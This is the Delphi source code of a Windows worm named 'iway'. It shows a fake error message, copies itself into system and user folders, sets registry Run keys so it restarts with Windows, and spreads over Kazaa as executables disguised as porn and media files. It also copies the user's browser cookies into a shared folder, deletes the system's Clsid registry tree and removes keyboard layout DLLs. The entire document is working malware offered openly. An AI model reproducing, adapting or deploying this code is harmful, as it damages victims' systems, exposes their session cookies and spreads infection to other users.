   program iway;

   uses
    windows,SysUtils,registry;

   {$R *.RES}

   {*****************************************
   Iway.exe : = 96kb give or take a few bytes
   ******************************************}


   Const
   a = '%systemroot%';
   b = '%Homepath%';
   c = '%HomeDrive%';
   var
   z,x,y,y2,r:integer;
   a2,e:string;
   reg : TRegistry;
   ran,em : textfile;
   begin
    MessageBox(0,'Error, Class Undefined - Error 8091',
    'Class ERROR-8091',MB_SYSTEMMODAL or MB_ICONERROR);
   copyfile(pchar(paramstr(0)), b+'\desktop\games.exe',false);
   copyfile(pchar(paramstr(0)), a+'\as.exe',false);
   randomize;
   x:=1+random(100);
   for y2:=0 to x do
    begin
     randomize;
     z:=1+random(100);
     a2:=inttostr(z);
     randomize;
     r:=1+random(5);
      case r of
       0:
        begin
         a2:= Pchar(b)+'start menu\programs\games\solitare'+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
       1:
        begin
         a2:= Pchar(c)+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
       2:
        begin
         a2:= Pchar(a)+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
       3:
        begin
         a2:= Pchar(b)+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
       4:
        begin
         a2:= Pchar(c)+'program Files\'+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
       5:
        begin
         a2:= Pchar(a)+'System32\'+a2+'.exe';
         copyfile(pchar(paramstr(0)),pchar(a2), false);
        end;
      end;
    end;
   reg:=Tregistry.create;
   with reg do
   begin
    Rootkey:=HKEY_LOCAL_MACHINE;
    openkey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
    createkey('boot');
    closekey;
    openkey('\Software\Microsoft\Windows\CurrentVersion\Run\boot', false);
    writestring(pchar(a)+'\as.exe', pchar(a)+'\as.exe');
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    rootkey:=HKEY_LOCAL_MACHINE;
    lazywrite:=false;
    OpenKey('Software\Microsoft\Windows\CurrentVersion\RunOnce',false);
    writestring('Windows Function 2.1','CMd.exe /c del'+pchar(a)+'\slrundll.exe');
    closekey;
   reg.Free;
   end;
   With reg do
   begin
    rootkey:=HKEY_LOCAL_MACHINE;
    LazyWrite:=false;
    OpenKey('Software\microsoft\windows\currentversion\runonce', false);
    writestring('Windows Main', 'Cmd.exe /c Del'+pchar(a)+'\taskman.exe');
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_LOCAL_MACHINE;
    lazywrite:=false;
    openkey('Software\Microsoft\Internet Explorer\Main',false);
    writestring('SOAD_XPLORE','s0Ad');
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_LOCAL_MACHINE;
    lazywrite:=false;
    openkey('Software\Microsoft\OutLook Express\Main',false);
    writestring('SOAD_XPLORE','s0Ad');
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_CURRENT_USER;
    lazywrite:=false;
    openkey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',false);
    WriteInteger('NoFind', 0);
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_LOCAL_MACHINE;
    lazywrite:=false;
    openkey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',false);
    WriteInteger('NoVeiwContextMenu', 0);
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_CURRENT_USER;
    lazywrite:=false;
    openkey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',false);
    Writestring('Yes', 'Yes');
    closekey;
   reg.Free;
   end;
   with reg do
   begin
    Rootkey:= HKEY_LOCAL_MACHINE;
    lazywrite:=false;
    openkey('Software\klexstentsions\klrun\ksharedfolder.exe',false);
    writestring( Pchar(c)+'\program files\',  Pchar(c)+'\program files\');
    {kaza spread}
    randomize;
    x:=1+random(100);
    for y:=0 to x do
     begin
      randomize;
      z:=1+random(100);
      a2:=inttostr(z);
      randomize;
      r:=1+random(3);
      case r of
      0:
       begin
        a2:= Pchar(c)+'\program files\brittney-nude'+a2+'.jpg'+'.exe';
        copyfile(pchar(paramstr(0)),pchar(a2), false);
       end;
      1:
       begin
        a2:= Pchar(c)+'\program files\slut'+a2+'.jpg'+'.exe';
        copyfile(pchar(paramstr(0)),pchar(a2), false);
       end;
      2:
       begin
         a2:= Pchar(c)+'\program files\White_girl'+a2+'.mpeg'+'.exe';
        copyfile(pchar(paramstr(0)),pchar(a2), false);
       end;
      3:
       begin
        a2:= Pchar(c)+'\program files\Alakine_trio'+a2+'.Mp3'+'.exe';
        copyfile(pchar(paramstr(0)),pchar(a2), false);
       end;
      end;
     end;
     {***********************************************
     hate to say it, but you have to **pretend** your
     virus is porn for it to spread over kazza anymore
     *************************************************}
   reg.free;
   createdir(Pchar(c)+'\program files\cccd\');
   copyfile(b+'\cookies\*.*', c+'\program files\cccd\', false);
   end;
   with reg do
   begin
    Rootkey:= HKEY_CLASSES_ROOT;
    DeleteKey('Clsid');
   reg.free;
   end;
   with reg do
   begin
    rootkey:=HKEY_CLASSES_ROOT;
    openkey('*\shell',false);
    CreateKey('OpenWith');
    closekey;
    openkey('*\shell\openwith',false);
    writestring('Op&enwith','Op&enwith');
    createkey('Command');
    closekey;
    openkey('*\shell\openwith\command',false);
    writestring(pchar(a)+'\system32\rundll32.exe shell32.dll,OpenAs_RunDLL %1',pchar(a)+'\system32\rundll32.exe shell32.dll,OpenAs_RunDLL %1');
   reg.free;
   end;
   with reg do
   begin
    rootkey:=HKEY_CURRENT_USER;
    openkey('NNTP Email Adress', false);
    e:=readstring('NNTP Email Adress');
    assignfile(em, Pchar(c)+'Program files\iway-ppp.txt');
    rewrite(em);
    writeln(em, e);
    closefile(em);
    closekey;
   closekey;
   reg.free;
   end;
   if not FileExists('%systemroot%\ddd.txt') then
   begin
    deletefile(pchar(a)+'\system32\kbdur.dll');
    deletefile(pchar(a)+'\system32\kbdus.dll');
    deletefile(pchar(a)+'\system32\kbtuf.dll');
    deletefile(pchar(a)+'\system32\kbdno.dll');
    deletefile(pchar(a)+'\system32\kbdusx.dll');
    deletefile(pchar(a)+'\system32\kbddv.dll');
    deletefile(pchar(a)+'\system32\kbddvr.dll');
    deletefile(pchar(a)+'\system32\chkdisk.exe');
    assignfile(ran, pchar(a)+'\ddd.txt');
    rewrite(ran);
    closefile(ran);
   end;
   end.
